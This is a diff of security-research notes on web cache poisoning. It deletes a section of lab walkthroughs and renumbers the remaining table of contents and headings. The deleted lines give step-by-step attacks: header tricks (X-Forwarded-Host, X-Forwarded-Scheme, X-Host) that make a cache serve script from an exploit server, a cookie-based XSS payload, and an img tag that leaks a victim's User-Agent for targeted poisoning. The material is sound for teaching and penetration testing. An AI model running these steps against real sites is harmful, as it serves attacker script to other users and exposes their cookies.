@@ -1,8 +1,4 @@
-# Web Cache Poisoning — Deep Technical Notes
-
-> **Purpose:** Practical + theoretical understanding for security researchers and penetration testers.
-
----
+# Web Cache Poisoning
 
 ## Table of Contents
 
@@ -17,10 +13,9 @@
    - 5.4 [Multi-Header Exploitation](#54-multi-header-exploitation)
    - 5.5 [Targeted Poisoning Using `Vary` Header](#55-targeted-poisoning-using-vary-header)
 6. [Information Leakage That Helps Attackers](#6-information-leakage-that-helps-attackers)
-7. [Lab Walkthroughs (Step-by-Step)](#7-lab-walkthroughs-step-by-step)
-8. [Impact Assessment](#8-impact-assessment)
-9. [Defense & Prevention](#9-defense--prevention)
-10. [Quick Reference Cheat Sheet](#10-quick-reference-cheat-sheet)
+7. [Impact Assessment](#7-impact-assessment)
+8. [Defense & Prevention](#8-defense--prevention)
+9. [Quick Reference Cheat Sheet](#9-quick-reference-cheat-sheet)
 
 ---
 
@@ -296,81 +291,7 @@ Cache-Control: public, max-age=1800
 
 ---
 
-## 7. Lab Walkthroughs (Step-by-Step)
-
-### Lab 1: Unkeyed Header → JS Import Poisoning
-
-**Objective:** Poison cache to load malicious JS file via `X-Forwarded-Host`.
-
-```
-1. Load home page with Burp running.
-2. Find GET request for /resources/js/tracking.js in HTTP history.
-3. Send to Repeater. Add ?cb=1234 (cache buster).
-4. Add header: X-Forwarded-Host: example.com
-5. Observe the response reflects this host in a <script src="..."> tag.
-6. On exploit server, create /resources/js/tracking.js with body: alert(document.cookie)
-7. Change header to: X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
-8. Send until you see X-Cache: hit in response headers.
-9. Remove cache buster → resend to poison real cache.
-10. Keep replaying to maintain poison until victim visits.
-```
-
----
-
-### Lab 2: Unkeyed Cookie → XSS
-
-**Objective:** Poison cache using a cookie value reflected in a JS object.
-
-```
-1. Load home page, find that fehost cookie is set (e.g., fehost=prod-cache-01).
-2. Notice the cookie value appears inside a JS object in the response.
-3. Send to Repeater. Add ?cb=1234 cache buster.
-4. Modify cookie: fehost=someString"-alert(1)-"someString
-5. Send request → confirm payload reflected in response.
-6. Replay until X-Cache: hit.
-7. Remove cache buster → resend to poison real cache.
-```
-
----
-
-### Lab 3: Multiple Headers → Redirect Poisoning
-
-**Objective:** Chain X-Forwarded-Scheme + X-Forwarded-Host to poison a redirect.
-
-```
-1. Load home page, find GET for /resources/js/tracking.js.
-2. Add X-Forwarded-Scheme: http → observe 302 redirect to HTTPS.
-3. Add X-Forwarded-Host: example.com alongside it.
-4. Observe redirect Location now points to https://example.com/...
-5. On exploit server, host /resources/js/tracking.js with: alert(document.cookie)
-6. Set X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
-7. Keep X-Forwarded-Scheme: nothttps (anything not HTTPS triggers redirect).
-8. Send until exploit URL appears in Location header and X-Cache: hit.
-9. Remove cache buster → keep replaying.
-```
-
----
-
-### Lab 4: Targeted Attack via Unknown Header + Vary
-
-**Objective:** Steal victim's User-Agent, then poison cache only for their browser.
-
-```
-1. Run Param Miner on home page → discovers secret header X-Host.
-2. Set X-Host: example.com → observe it controls JS import URL.
-3. On exploit server, host /resources/js/tracking.js with payload.
-4. Set X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net → confirm X-Cache: hit.
-5. Notice response has: Vary: User-Agent
-6. Post comment on target site: <img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
-7. Watch exploit server access log → a different User-Agent will appear (victim).
-8. Copy victim's User-Agent.
-9. In Repeater, set that User-Agent + X-Host exploit header.
-10. Remove cache buster → send until cache is poisoned for victim's UA.
-```
-
----
-
-## 8. Impact Assessment
+## 7. Impact Assessment
 
 | Factor | Low Impact | High Impact |
 |--------|-----------|------------|
@@ -389,7 +310,7 @@ Cache-Control: public, max-age=1800
 
 ---
 
-## 9. Defense & Prevention
+## 8. Defense & Prevention
 
 ### 1. Disable Caching (If Feasible)
 
@@ -433,7 +354,7 @@ CDNs and third-party integrations often support obscure headers by default. Audi
 
 ---
 
-## 10. Quick Reference Cheat Sheet
+## 9. Quick Reference Cheat Sheet
 
 ### Signs a Site May Be Vulnerable
 
